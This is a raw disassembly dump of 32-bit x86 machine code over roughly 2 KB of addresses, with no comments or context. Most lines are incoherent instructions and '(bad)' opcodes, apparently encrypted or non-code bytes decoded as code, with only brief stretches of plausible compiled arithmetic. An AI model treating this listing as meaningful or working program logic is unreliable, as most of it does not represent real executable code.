  41043d:	scas   eax,DWORD PTR es:[edi]
  41043e:	pushf  
  41043f:	scas   al,BYTE PTR es:[edi]
  410440:	mov    dh,0xbb
  410442:	data16 outs dx,BYTE PTR ds:[esi]
  410444:	adc    edi,DWORD PTR [ebp-0x64df9d6d]
  41044a:	mov    ds:0x3a8e3bc3,eax
  41044f:	in     eax,dx
  410450:	mov    ebp,0xde4b6133
  410455:	lods   al,BYTE PTR ds:[esi]
  410456:	mov    esp,0xe3ef0eab
  41045b:	adc    eax,0xd4a9307
  410460:	fnsave [edi]
  410462:	not    DWORD PTR [ebx+0x3dec0606]
  410468:	call   0xc75c:0xa731131b
  41046f:	xor    ch,dh
  410471:	push   edx
  410472:	out    0xe6,eax
  410474:	xchg   edx,eax
  410475:	dec    esi
  410476:	cmp    ah,0x50
  410479:	int3   
  41047a:	sub    BYTE PTR [ebx],al
  41047c:	fild   DWORD PTR [edx+0x15]
  41047f:	dec    edi
  410480:	add    esi,esp
  410482:	inc    edx
  410483:	ret    0xa2d4
  410486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410487:	lahf   
  410488:	and    edx,DWORD PTR [edx+edx*8]
  41048b:	into   
  41048c:	in     al,dx
  41048d:	cdq    
  41048e:	ret    0x5ab2
  410491:	pop    edi
  410492:	jmp    0x410455
  410494:	jg     0x410452
  410496:	jle    0x4104f9
  410498:	jecxz  0x410444
  41049a:	data16 jb 0x410442
  41049d:	jmp    0x51340ed4
  4104a2:	push   edi
  4104a3:	in     al,0x1a
  4104a5:	push   ecx
  4104a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a7:	or     BYTE PTR ds:0x5cf86e92,ch
  4104ad:	dec    edx
  4104ae:	es sub eax,0x811c559d
  4104b4:	dec    esp
  4104b5:	xchg   edx,eax
  4104b6:	(bad)  
  4104b7:	int3   
  4104b8:	pop    ebx
  4104b9:	add    dl,BYTE PTR [eax+0x536fdfb2]
  4104bf:	adc    BYTE PTR [edi-0x75fe97ac],0xb0
  4104c6:	ds xchg ebx,eax
  4104c8:	aas    
  4104c9:	lods   eax,DWORD PTR ds:[esi]
  4104ca:	cmp    eax,0x3426ecc2
  4104cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104d0:	push   cs
  4104d1:	jnp    0x410458
  4104d3:	push   eax
  4104d4:	jg     0x4104f6
  4104d6:	ds jnp 0x41054b
  4104d9:	ja     0x410537
  4104db:	outs   dx,BYTE PTR ds:[esi]
  4104dc:	xchg   DWORD PTR [esi],edx
  4104de:	gs popf 
  4104e0:	sbb    BYTE PTR [ebp+0xe],dh
  4104e3:	xor    ebp,DWORD PTR [esi-0x515ba313]
  4104e9:	jae    0x410552
  4104eb:	mov    ch,BYTE PTR [ecx+0x1679d5b9]
  4104f1:	mov    ch,0x52
  4104f3:	sbb    eax,0x72f50122
  4104f8:	int    0xa
  4104fa:	mov    dh,0x0
  4104fc:	or     eax,0xeeabcd4c
  410501:	in     al,dx
  410502:	loopne 0x41052e
  410504:	sbb    DWORD PTR [edi-0x29582a32],ebx
  41050a:	mov    al,0x44
  41050c:	add    eax,0xf9a11adb
  410511:	mov    al,0xf8
  410513:	sar    DWORD PTR [edx+0x2137cdf3],1
  410519:	or     ch,BYTE PTR [ebp+0x65]
  41051c:	popa   
  41051d:	bound  ecx,QWORD PTR [esi]
  41051f:	mov    dh,0x7b
  410521:	scas   eax,DWORD PTR es:[edi]
  410522:	jle    0x4104aa
  410524:	jns    0x410535
  410526:	and    BYTE PTR [ecx+0x75],0xf6
  41052a:	mov    cs,WORD PTR [ebx+ebp*1]
  41052d:	(bad)  
  41052e:	frstor [esi-0x1ea4df70]
  410534:	clc    
  410535:	push   cs
  410536:	sbb    eax,0x1a6bea25
  41053b:	scas   eax,DWORD PTR es:[edi]
  41053c:	sbb    eax,0xea4683a1
  410541:	div    dh
  410543:	inc    edx
  410544:	out    0x85,al
  410546:	sbb    BYTE PTR [edi+0x3a8dec88],cl
  41054c:	jae    0x41053f
  41054e:	idiv   ecx
  410550:	div    DWORD PTR [ecx]
  410552:	outs   dx,BYTE PTR ds:[esi]
  410553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410554:	push   edx
  410555:	imul   ecx,DWORD PTR [eax],0x1c
  410558:	loop   0x410559
  41055a:	jg     0x41053b
  41055c:	test   al,0x89
  41055e:	cmp    DWORD PTR [edx],edx
  410560:	cmp    edi,DWORD PTR [esi+ebx*4+0x24]
  410564:	mov    ds,WORD PTR [ecx+0x2fa1cd43]
  41056a:	lds    ecx,FWORD PTR [eax+0xd276742]
  410570:	push   ebp
  410571:	jp     0x41053f
  410573:	adc    DWORD PTR [ecx-0x3f0638d8],esi
  410579:	call   0x55df:0x5d95f1be
  410580:	(bad)  
  410581:	stc    
  410582:	popa   
  410583:	scas   al,BYTE PTR es:[edi]
  410584:	push   esi
  410585:	sahf   
  410586:	jp     0x4105b7
  410588:	add    al,0xbe
  41058a:	mov    dl,0xa
  41058c:	xchg   ecx,eax
  41058d:	push   ebp
  41058e:	sbb    DWORD PTR [ecx-0x3cd34f70],ebx
  410594:	je     0x41059d
  410596:	scas   al,BYTE PTR es:[edi]
  410597:	xchg   BYTE PTR [esi-0x32694659],dl
  41059d:	int3   
  41059e:	mov    al,ds:0x39c3c997
  4105a3:	lahf   
  4105a4:	stos   BYTE PTR es:[edi],al
  4105a5:	xlat   BYTE PTR ds:[ebx]
  4105a6:	cwde   
  4105a7:	ret    
  4105a8:	pop    ss
  4105a9:	rcr    DWORD PTR [esi],cl
  4105ab:	mov    ebp,0xfbff4d28
  4105b0:	or     edx,DWORD PTR [edi]
  4105b2:	mov    al,ds:0x36def30d
  4105b7:	jne    0x4105df
  4105b9:	not    DWORD PTR [edi]
  4105bb:	ins    BYTE PTR es:[edi],dx
  4105bc:	fstp   DWORD PTR [edx]
  4105be:	jl     0x41063f
  4105c0:	and    DWORD PTR [eax+0x64],ebx
  4105c3:	ret    
  4105c4:	imul   BYTE PTR [edx]
  4105c6:	adc    ebp,DWORD PTR [ebx+0x32]
  4105c9:	push   0xffffffab
  4105cb:	inc    ebp
  4105cc:	imul   eax,DWORD PTR [esi+0x29],0x239599c8
  4105d3:	cs add al,0x92
  4105d6:	xchg   DWORD PTR [ecx+0x19ce07ea],esp
  4105dc:	cmp    DWORD PTR [eax+ecx*4+0x1d],0xdffa5680
  4105e4:	jl     0x4105a4
  4105e6:	or     al,0x9
  4105e8:	loop   0x4105be
  4105ea:	sbb    BYTE PTR [ebp-0x4e2ddcbb],cl
  4105f0:	jae    0x41060c
  4105f2:	cmp    DWORD PTR [esi-0x7e],edx
  4105f5:	mov    eax,ds:0xdfa2da4d
  4105fa:	mov    esp,0x75e8462d
  4105ff:	sub    BYTE PTR [eax-0x3f],cl
  410602:	xchg   ebp,eax
  410603:	(bad)  
  410604:	fsub   QWORD PTR [eax-0x22d796af]
  41060a:	mov    edx,edx
  41060c:	arpl   WORD PTR [edx+ebx*2],di
  41060f:	mov    DWORD PTR [edx-0x2ba2740a],esp
  410615:	mov    ecx,DWORD PTR [ebp+0xc]
  410618:	add    esi,DWORD PTR [ecx]
  41061a:	xor    edx,0xcb79b577
  410620:	shrd   edx,eax,0x2
  410624:	xor    ecx,ecx
  410626:	shl    esi,0x1e
  410629:	xor    ecx,edi
  41062b:	shr    eax,0x2
  41062e:	or     ecx,edx
  410630:	xor    esi,0x80000000
  410636:	or     esi,eax
  410638:	mov    DWORD PTR [ebp-0x40],ecx
  41063b:	push   edi
  41063c:	mov    DWORD PTR [ebp-0x3c],esi
  41063f:	mov    eax,DWORD PTR [ebp-0x48]
  410642:	mov    ecx,DWORD PTR [ebp-0x44]
  410645:	push   0xae0404d3
  41064a:	push   ecx
  41064b:	push   eax
  41064c:	call   0x422283
  410651:	mov    ecx,eax
  410653:	mov    eax,DWORD PTR [ebp-0x50]
  410656:	mov    esi,DWORD PTR [ebp-0x4c]
  410659:	or     ecx,eax
  41065b:	mov    eax,DWORD PTR [ebp-0x40]
  41065e:	or     edx,esi
  410660:	jmp    0x410a14
  410665:	pop    ebx
  410666:	icebp  
  410667:	lds    esp,FWORD PTR [eax+0x3abbbc68]
  41066d:	ror    ecx,0xfe
  410670:	fisttp QWORD PTR [edi]
  410672:	retf   
  410673:	cld    
  410674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410675:	out    dx,eax
  410676:	cmp    al,0xbe
  410678:	mov    esi,0xbebec4e3
  41067d:	rol    bl,1
  41067f:	lods   eax,DWORD PTR ds:[esi]
  410680:	xchg   ebx,eax
  410681:	pop    ebx
  410682:	inc    ebp
  410683:	ja     0x4106e0
  410685:	mov    dl,bh
  410687:	mov    ah,ch
  410689:	mov    esp,0xe0e17e76
  41068e:	(bad)  
  41068f:	hlt    
  410690:	test   eax,0xa79220e2
  410695:	xor    ebx,ecx
  410697:	out    dx,al
  410698:	dec    eax
  410699:	outs   dx,BYTE PTR ds:[esi]
  41069a:	mov    WORD PTR [ebx+0x64],fs
  41069d:	mov    dh,0xc7
  41069f:	aas    
  4106a0:	or     DWORD PTR [ebp+0x2cc80bac],edi
  4106a6:	pusha  
  4106a7:	fldcw  WORD PTR [edx+0x44]
  4106aa:	xchg   esi,eax
  4106ab:	sti    
  4106ac:	jp     0x4106f6
  4106ae:	push   0xffffffaa
  4106b0:	pop    edi
  4106b1:	jecxz  0x4106e1
  4106b3:	or     bl,BYTE PTR [ebp-0x74d5613e]
  4106b9:	ror    BYTE PTR ds:0xa51a76f,1
  4106bf:	adc    al,BYTE PTR [esi+ebp*1]
  4106c2:	(bad)  
  4106c3:	retf   0xc03d
  4106c6:	loop   0x410693
  4106c8:	imul   ebx,DWORD PTR [esi],0xfa557dcd
  4106ce:	ror    DWORD PTR [edx-0x2b3fc37],1
  4106d4:	push   ds
  4106d5:	mov    ah,0x56
  4106d7:	in     al,0xe7
  4106d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106da:	mov    esi,0x6664cc5
  4106df:	cmp    BYTE PTR [edx+0x72],ah
  4106e2:	mov    ebp,0xa8ebac57
  4106e7:	mov    fs,eax
  4106e9:	stos   DWORD PTR es:[edi],eax
  4106ea:	stc    
  4106eb:	inc    ebx
  4106ec:	xchg   esi,eax
  4106ed:	ret    
  4106ee:	add    al,0x98
  4106f0:	sti    
  4106f1:	jnp    0x41073c
  4106f3:	xchg   BYTE PTR [edx+edi*1+0x1],dl
  4106f7:	dec    ebp
  4106f8:	shl    dh,1
  4106fa:	cmc    
  4106fb:	nop
  4106fc:	push   ebx
  4106fd:	push   esi
  4106fe:	fidiv  WORD PTR [edi]
  410700:	das    
  410701:	out    dx,al
  410702:	push   eax
  410703:	jle    0x4106cf
  410705:	push   edi
  410706:	add    dl,BYTE PTR [esi+0x23b0b328]
  41070c:	test   BYTE PTR [edx],0x60
  41070f:	sti    
  410710:	xchg   edx,eax
  410711:	jb     0x41075d
  410713:	(bad)  
  410714:	pop    ss
  410715:	addr16 add al,0xb4
  410718:	dec    edx
  410719:	mov    ?,WORD PTR [ecx+0x1f0f120f]
  41071f:	loop   0x4106cd
  410721:	inc    edi
  410722:	ror    BYTE PTR [ecx],cl
  410724:	mov    WORD PTR [ebp-0x23ed70b0],ds
  41072a:	loop   0x410712
  41072c:	(bad)  
  41072d:	adc    BYTE PTR [esi+0x66],al
  410730:	jecxz  0x4106d9
  410732:	adc    BYTE PTR [esi],0xf9
  410735:	jle    0x4106f3
  410737:	lods   eax,DWORD PTR ds:[esi]
  410738:	mov    bh,0x93
  41073a:	sbb    DWORD PTR [edx-0x2d],ebx
  41073d:	int3   
  41073e:	mov    ecx,0xa6f6306a
  410743:	or     ebx,ebp
  410745:	adc    BYTE PTR ds:0xdde2b1f9,al
  41074b:	jecxz  0x4107ba
  41074d:	mul    BYTE PTR [ebx+0x31e095e7]
  410753:	daa    
  410754:	retf   
  410755:	inc    edx
  410756:	or     edx,esp
  410758:	fcom   DWORD PTR [ecx+0x30dcd2cc]
  41075e:	in     al,0xb3
  410760:	pop    es
  410761:	idiv   DWORD PTR [edx+0x3e614a06]
  410767:	or     BYTE PTR [eax],dh
  410769:	ja     0x4106fc
  41076b:	cdq    
  41076c:	repz (bad) 
  41076e:	loope  0x41078a
  410770:	loopne 0x410743
  410772:	mov    esi,0x9beea21f
  410777:	lods   al,BYTE PTR ds:[esi]
  410778:	cmp    al,0xdf
  41077a:	pop    ecx
  41077b:	pop    ebp
  41077c:	mov    ch,0xf2
  41077e:	mov    ecx,es
  410780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410781:	xor    al,0xf8
  410783:	sbb    DWORD PTR [eax],ebp
  410785:	in     al,0xc7
  410787:	scas   al,BYTE PTR es:[edi]
  410788:	mov    eax,0xc1fb5bfd
  41078d:	inc    ebp
  41078e:	xor    esp,DWORD PTR [eax+eiz*4+0x1e]
  410792:	dec    esp
  410793:	lea    esp,[edi]
  410795:	pusha  
  410796:	jno    0x41076d
  410798:	jmp    0x21ff:0x11c7d088
  41079f:	push   eax
  4107a0:	cli    
  4107a1:	add    BYTE PTR [esi],bl
  4107a3:	in     eax,0xbb
  4107a5:	pop    ss
  4107a6:	jno    0x410762
  4107a8:	cmp    cl,BYTE PTR [edx+esi*1+0x1f]
  4107ac:	push   DWORD PTR ds:0xd63308a1
  4107b2:	addr16 jnp 0x41073e
  4107b5:	or     esi,DWORD PTR [edi+0x4a]
  4107b8:	fidiv  WORD PTR [ecx+0x42]
  4107bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107bc:	mov    ds:0xe9fc239f,al
  4107c1:	cwde   
  4107c2:	out    0xef,al
  4107c4:	mov    esp,0xf1c21f33
  4107c9:	mov    eax,0x9de2509f
  4107ce:	jne    0x410778
  4107d0:	aas    
  4107d1:	stos   DWORD PTR es:[edi],eax
  4107d2:	enter  0x5e67,0x8e
  4107d6:	cs dec esi
  4107d8:	xchg   edx,eax
  4107d9:	cmc    
  4107da:	fwait
  4107db:	mov    ss,edi
  4107dd:	jnp    0x4107b9
  4107df:	das    
  4107e0:	and    dl,BYTE PTR [ecx]
  4107e2:	inc    edi
  4107e3:	pop    ebp
  4107e4:	call   0xf470:0xa778f61a
  4107eb:	push   ecx
  4107ec:	popf   
  4107ed:	retf   0x96aa
  4107f0:	pop    es
  4107f1:	add    DWORD PTR [edx],0xffffffe7
  4107f4:	sub    eax,0x9b4a6ee7
  4107f9:	popa   
  4107fa:	loop   0x410820
  4107fc:	jmp    0x41083f
  4107fe:	outs   dx,DWORD PTR ss:[esi]
  410800:	inc    esi
  410801:	pop    esp
  410802:	rol    DWORD PTR [ebx-0x4995d338],cl
  410808:	call   0xb5278ccc
  41080d:	xlat   BYTE PTR ds:[ebx]
  41080e:	mov    DWORD PTR [esi],ecx
  410810:	aas    
  410811:	sub    ch,ch
  410813:	mov    al,0x73
  410815:	lds    ecx,FWORD PTR [ebx+0x14]
  410818:	add    eax,0x21ee3a5b
  41081d:	data16 lock sahf 
  410820:	mov    ds:0x958931a8,al
  410825:	mov    ebp,0x30a035a5
  41082a:	cwde   
  41082b:	or     eax,0xe170b1
  410830:	pop    edi
  410831:	(bad)  
  410832:	pop    ebx
  410833:	pop    eax
  410834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410835:	mov    ebp,0x7d333b68
  41083a:	mov    edx,0x61b86012
  41083f:	ss inc esp
  410841:	scas   al,BYTE PTR es:[edi]
  410842:	(bad)  
  410843:	jg     0x4108b8
  410845:	adc    al,0x58
  410847:	dec    ebx
  410848:	mov    edi,0xad64797e
  41084d:	dec    ebp
  41084e:	mov    ds:0xa79065c1,al
  410853:	ss ss aas 
  410856:	add    ebp,ebx
  410858:	push   edi
  410859:	ror    esp,1
  41085b:	hlt    
  41085c:	pushf  
  41085d:	adc    BYTE PTR [ecx-0x37c27776],cl
  410863:	pop    ebp
  410864:	sub    al,0x5
  410866:	repz in eax,dx
  410868:	rol    DWORD PTR [edi+0x8],1
  41086b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41086c:	pop    ebp
  41086d:	jns    0x4108eb
  41086f:	stos   DWORD PTR es:[edi],eax
  410870:	repnz push eax
  410872:	or     DWORD PTR [ebx+esi*1-0x55],0x76
  410877:	sub    eax,DWORD PTR [edi+0x7b]
  41087a:	fincstp 
  41087c:	je     0x4108b9
  41087e:	arpl   WORD PTR [eax-0x76ed2356],si
  410884:	mov    esi,0x45d00c52
  410889:	or     ebp,eax
  41088b:	leave  
  41088c:	test   al,0xaa
  41088e:	mov    BYTE PTR [ecx+0x37],ch
  410891:	scas   eax,DWORD PTR es:[edi]
  410892:	ins    BYTE PTR es:[edi],dx
  410893:	popa   
  410894:	fstp   QWORD PTR [edi-0x14]
  410897:	jo     0x4108f8
  410899:	adc    DWORD PTR [esi-0x6c2eef3b],edx
  41089f:	cmp    DWORD PTR ds:0x2026001e,0x7e
  4108a6:	dec    esp
  4108a7:	icebp  
  4108a8:	push   ebp
  4108a9:	add    ebx,DWORD PTR [eax+0x66]
  4108ac:	daa    
  4108ad:	and    cl,bl
  4108af:	inc    eax
  4108b0:	adc    DWORD PTR [eax+esi*2+0x32],ecx
  4108b4:	jns    0x410930
  4108b6:	(bad)  
  4108b7:	pop    ecx
  4108b8:	xchg   esi,eax
  4108b9:	les    ebx,FWORD PTR [edi-0x7b4f9958]
  4108bf:	sbb    al,0x33
  4108c1:	pop    edx
  4108c2:	xchg   DWORD PTR [eax+0x21],ebp
  4108c5:	add    al,0xad
  4108c7:	push   eax
  4108c8:	popa   
  4108c9:	enter  0xb15f,0x92
  4108cd:	xchg   edx,eax
  4108ce:	nop
  4108cf:	(bad)  
  4108d0:	scas   eax,DWORD PTR es:[edi]
  4108d1:	xor    BYTE PTR [edi-0x61d44421],cl
  4108d7:	cmp    al,0xf1
  4108d9:	adc    BYTE PTR [ecx+0x4b5b967e],bh
  4108df:	cmp    DWORD PTR [esi-0x188f46ee],ebp
  4108e5:	and    BYTE PTR ds:0x26d5ac74,cl
  4108eb:	outs   dx,DWORD PTR ds:[esi]
  4108ec:	push   0x63
  4108ee:	push   edx
  4108ef:	mov    edx,0xa9e1e61b
  4108f4:	adc    edx,DWORD PTR [edi]
  4108f6:	cmp    ebx,DWORD PTR ds:0x7db87d5b
  4108fc:	mov    BYTE PTR [ecx],ah
  4108fe:	sbb    edi,DWORD PTR [ebp-0x7eda7307]
  410904:	popa   
  410905:	in     al,dx
  410906:	mov    gs,WORD PTR [esi-0x7be37ab3]
  41090c:	xor    ebx,DWORD PTR [edi+0x44]
  41090f:	scas   al,BYTE PTR es:[edi]
  410910:	popf   
  410911:	ins    BYTE PTR es:[edi],dx
  410912:	scas   al,BYTE PTR es:[edi]
  410913:	into   
  410914:	cmp    BYTE PTR [eax-0x71be358e],ch
  41091a:	inc    ecx
  41091b:	push   es
  41091c:	jno    0x410904
  41091e:	repz (bad) 
  410920:	int3   
  410921:	(bad)  
  410922:	xor    DWORD PTR cs:[edx],ecx
  410925:	call   0x767144c7
  41092a:	(bad)  
  41092b:	iret   
  41092c:	out    0x90,eax
  41092e:	je     0x4108d7
  410930:	cmp    eax,0xc2f720ea
  410935:	cs jb  0x4108f6
  410938:	sub    dh,0x96
  41093b:	out    dx,al
  41093c:	sub    al,0xe5
  41093e:	xor    DWORD PTR [edx+0x29],eax
  410941:	clc    
  410942:	addr16 or al,0x27
  410945:	cs xchg esp,eax
  410947:	scas   eax,DWORD PTR es:[edi]
  410948:	pop    ebp
  410949:	mov    bl,0x20
  41094b:	xchg   edx,eax
  41094c:	aad    0xd7
  41094e:	push   ss
  41094f:	das    
  410950:	aas    
  410951:	daa    
  410952:	ja     0x410915
  410954:	push   edx
  410955:	and    DWORD PTR [edi+0x13e23426],edx
  41095b:	pop    ebp
  41095c:	jmp    0x5b41:0xf729db68
  410963:	sbb    eax,0x5baa3d
  410968:	add    dh,BYTE PTR [edi+ecx*1+0x46b09f2f]
  41096f:	or     bh,dh
  410971:	aam    0x16
  410973:	data16 fwait
  410975:	out    0x41,eax
  410977:	in     eax,dx
  410978:	sbb    al,0x21
  41097a:	cmp    ecx,DWORD PTR [esi-0xcbd7c5b]
  410980:	clc    
  410981:	lahf   
  410982:	xor    cl,ch
  410984:	icebp  
  410985:	je     0x41099a
  410987:	mov    cl,0x3a
  410989:	pop    edi
  41098a:	xchg   ebx,eax
  41098b:	lods   al,BYTE PTR ds:[esi]
  41098c:	lods   eax,DWORD PTR ds:[esi]
  41098d:	xchg   esi,eax
  41098e:	adc    eax,0x19f8cd52
  410993:	mov    ds:0xb2c8a612,eax
  410998:	outs   dx,BYTE PTR ds:[esi]
  410999:	(bad)  
  41099a:	fisubr DWORD PTR [ebx+0x6b]
  41099d:	xchg   DWORD PTR [eax*2-0x3fd959cd],edi
  4109a4:	dec    edi
  4109a5:	xchg   edx,eax
  4109a6:	aas    
  4109a7:	cmp    al,0x11
  4109a9:	shr    eax,0x1f
  4109ac:	mov    eax,0x58f16598
  4109b1:	dec    esi
  4109b2:	or     eax,0x9572b885
  4109b7:	jmp    0x5b1acfc3
  4109bc:	mov    ebx,0x64eb49a8
  4109c1:	data16 jl 0x410a20
  4109c4:	sub    al,0x88
  4109c6:	repnz loopne 0x4109b9
  4109c9:	dec    DWORD PTR [edi-0x39]
  4109cc:	mov    ds:0x53c828d6,al
  4109d1:	fisub  DWORD PTR [edi+0x59]
  4109d4:	sbb    edi,DWORD PTR [edx+0x52]
  4109d7:	or     al,0x2d
  4109d9:	and    dh,0xda
  4109dc:	pop    ds
  4109dd:	or     edi,DWORD PTR [ecx+ecx*1]
  4109e0:	add    edi,0xffffffa8
  4109e3:	cmp    cl,dh
  4109e5:	aaa    
  4109e6:	ret    0xa034
  4109e9:	push   edx
  4109ea:	pop    eax
  4109eb:	stos   BYTE PTR es:[edi],al
  4109ec:	fbstp  TBYTE PTR [ebx]
  4109ee:	popf   
  4109ef:	xchg   ebx,eax
  4109f0:	cmp    al,0xec
  4109f2:	jno    0x410a43
  4109f4:	ficom  WORD PTR [ecx+0xfa71270]
  4109fa:	and    bl,ch
  4109fc:	push   edx
  4109fd:	and    dl,BYTE PTR [ebx]
  4109ff:	fidiv  DWORD PTR [ebp-0x6f]
  410a02:	cs (bad) 
  410a04:	jmp    0x4f2e9e00
  410a09:	xor    al,0xc9
  410a0b:	ss and eax,0xd0d8819a
  410a11:	in     al,0x5f
  410a13:	mov    al,0x8b
  410a15:	jne    0x4109db
  410a17:	add    ecx,eax
  410a19:	mov    eax,DWORD PTR [ebp-0x58]
  410a1c:	adc    edx,esi
  410a1e:	mov    esi,DWORD PTR [ebp-0x54]
  410a21:	add    ecx,eax
  410a23:	mov    eax,DWORD PTR [ebp+0x8]
  410a26:	adc    edx,esi
  410a28:	add    ecx,0xffff55a8
  410a2e:	pop    edi
  410a2f:	adc    edx,0xffff64cd
  410a35:	pop    esi
  410a36:	mov    DWORD PTR [eax],ecx
  410a38:	jmp    0x410dec
  410a3d:	pop    esi
  410a3e:	sub    al,0xdf
  410a40:	shr    BYTE PTR [ebx+ebx*1+0x359fbc6e],1
  410a47:	mov    esp,0x283bc2a4
  410a4c:	rcl    DWORD PTR [esi],1
  410a4e:	inc    edx
  410a4f:	mov    esi,0xbec4e3be
  410a54:	mov    esi,0xdb628306
  410a59:	cli    
  410a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a5b:	icebp  
  410a5c:	sbb    BYTE PTR [ebx],bl
  410a5e:	gs xor al,0xd9
  410a61:	mov    bh,0xfa
  410a63:	ret    
  410a64:	mov    bh,0x9a
  410a66:	out    dx,al
  410a67:	lea    eax,[ecx-0x52]
  410a6a:	ins    DWORD PTR es:[edi],dx
  410a6b:	mov    DWORD PTR [ecx-0x48],edi
  410a6e:	add    eax,eax
  410a70:	stos   DWORD PTR es:[edi],eax
  410a71:	cmc    
  410a72:	mov    eax,0x6ec34080
  410a77:	jno    0x410a68
  410a79:	mov    ch,BYTE PTR [esi-0x297ee88b]
  410a7f:	scas   al,BYTE PTR es:[edi]
  410a80:	mov    ah,0xbc
  410a82:	call   FWORD PTR [edx+edi*1+0x3a1579d2]
  410a89:	pusha  
  410a8a:	imul   ebp,ebp,0x584e6fd5
  410a90:	test   DWORD PTR [ebp-0x50],esi
  410a93:	nop
  410a94:	or     DWORD PTR [edi-0x4528dfa5],esp
  410a9a:	pop    ebx
  410a9b:	xchg   ecx,eax
  410a9c:	test   DWORD PTR [ecx],esi
  410a9e:	pop    ebp
  410a9f:	test   DWORD PTR [ebx-0x50],ebx
  410aa2:	inc    esi
  410aa3:	adc    dl,dl
  410aa5:	push   edx
  410aa6:	push   esp
  410aa7:	adc    edi,DWORD PTR [ebx+0x2e]
  410aaa:	mov    esp,0x69823d1e
  410aaf:	(bad)
  410ab2:	xchg   ebx,eax
  410ab3:	push   ecx
  410ab4:	leave  
  410ab5:	or     ebp,DWORD PTR [edi+0x118451b7]
  410abb:	ins    WORD PTR es:[edi],dx
  410abd:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  410abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ac0:	test   DWORD PTR [edi-0x8351d46],ebx
  410ac6:	dec    eax
  410ac7:	xor    ebx,esi
  410ac9:	cs inc eax
  410acb:	(bad)  ds:0xfe355dd9
  410ad1:	sub    eax,0x794e099d
  410ad6:	sub    edi,ebp
  410ad8:	push   ebp
  410ad9:	or     DWORD PTR [ebp-0x19690663],edx
  410adf:	aaa    
  410ae0:	dec    esi
  410ae1:	arpl   WORD PTR [edx+0x47],ax
  410ae4:	xor    DWORD PTR [eax+0x14e92322],ebx
  410aea:	outs   dx,DWORD PTR ds:[esi]
  410aeb:	call   0xb16:0xdbba18e9
  410af2:	mov    ?,WORD PTR [esp+edi*8+0x486767b4]
  410af9:	jno    0x410b24
  410afb:	mov    WORD PTR [edx-0x62],gs
  410afe:	jbe    0x410a85
  410b00:	inc    ebx
  410b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b02:	clc    
  410b03:	jno    0x410aeb
  410b05:	sbb    al,0x5a
  410b07:	ins    BYTE PTR es:[edi],dx
  410b08:	fwait
  410b09:	or     BYTE PTR [ecx],ah
  410b0b:	xchg   ebp,eax
  410b0c:	ffreep st(5)
  410b0e:	in     al,0x2f
  410b10:	(bad)  
  410b11:	jle    0x410b74
  410b13:	mov    bl,0xc5
  410b15:	jnp    0x410ac8
  410b17:	inc    edx
  410b18:	adc    BYTE PTR [esi+0x40],bl
  410b1b:	fcom   DWORD PTR [esi-0x4a]
  410b1e:	jmp    0xc282f47b
  410b23:	and    al,0x45
  410b25:	inc    eax
  410b26:	or     ebx,esp
  410b28:	mov    cl,0x5b
  410b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b2b:	sub    DWORD PTR [esi],ebp
  410b2d:	push   edi
  410b2e:	or     eax,0xc912c390
  410b33:	and    DWORD PTR [edx-0x6c9cebc3],edx
  410b39:	(bad)  
  410b3a:	jno    0x410ba3
  410b3c:	inc    ebp
  410b3d:	cmp    ecx,DWORD PTR [esi+0x40]
  410b40:	sub    al,0x6f
  410b42:	adc    DWORD PTR [edi+edx*1-0x1f],eax
  410b46:	loopne 0x410b95
  410b48:	dec    edi
  410b49:	fdivr  QWORD PTR [edx-0x5b]
  410b4c:	adc    edi,0xb
  410b4f:	xchg   esp,eax
  410b50:	inc    ebp
  410b51:	rcl    DWORD PTR [edx+0x9],1
  410b54:	mov    ecx,0x3180aab4
  410b59:	mul    BYTE PTR [ebp+ecx*8+0x1e]
  410b5d:	in     eax,dx
  410b5e:	(bad)  
  410b5f:	not    DWORD PTR [esi]
  410b61:	sbb    al,0x9
  410b63:	inc    edx
  410b64:	pop    esi
  410b65:	lahf   
  410b66:	repnz arpl dx,di
  410b69:	add    bl,BYTE PTR [ebx]
  410b6b:	retf   
  410b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b6d:	and    ch,dl
  410b6f:	stc    
  410b70:	adc    edx,edx
  410b72:	out    0x2c,eax
  410b74:	push   ss
  410b75:	out    0x73,al
  410b77:	fimul  DWORD PTR [edi+0x27668f2a]
  410b7d:	xor    DWORD PTR [ebx],0x7f
  410b80:	sub    bh,BYTE PTR [ecx+0x7c]
  410b83:	retf   0x3f1f
  410b86:	push   esi
  410b87:	xor    ebx,edi
  410b89:	(bad)  
  410b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b8b:	push   esp
  410b8c:	ja     0x410b2c
  410b8e:	jne    0x410c06
  410b90:	xor    al,0x9e
  410b92:	mov    ebx,0x4fcd4ab4
  410b97:	test   al,0x78
  410b99:	sahf   
  410b9a:	adc    ah,BYTE PTR [edx+0x37]
  410b9d:	add    bh,BYTE PTR ds:0xbd6773f5
  410ba3:	mov    edx,0x31aa543c
  410ba8:	xor    bl,BYTE PTR [edi-0x3e20bf50]
  410bae:	popa   
  410baf:	test   al,0xba
  410bb1:	test   ebx,esp
  410bb3:	popa   
  410bb4:	popa   
  410bb5:	stos   DWORD PTR es:[edi],eax
  410bb6:	inc    esp
  410bb7:	mov    BYTE PTR [esi],ch
  410bb9:	ds and al,0xd1
  410bbc:	imul   esp,DWORD PTR [ebx],0x5957a0b
  410bc2:	sub    DWORD PTR [edi-0x47],edi
  410bc5:	sbb    bh,BYTE PTR [esp+ecx*8]
  410bc8:	mov    WORD PTR [edx+0x4b],gs
  410bcb:	jae    0x410bb0
  410bcd:	mov    ecx,0x1df6ed39
  410bd2:	mov    cs,eax
  410bd4:	push   cs
  410bd5:	mov    WORD PTR [ebx-0x7d],?
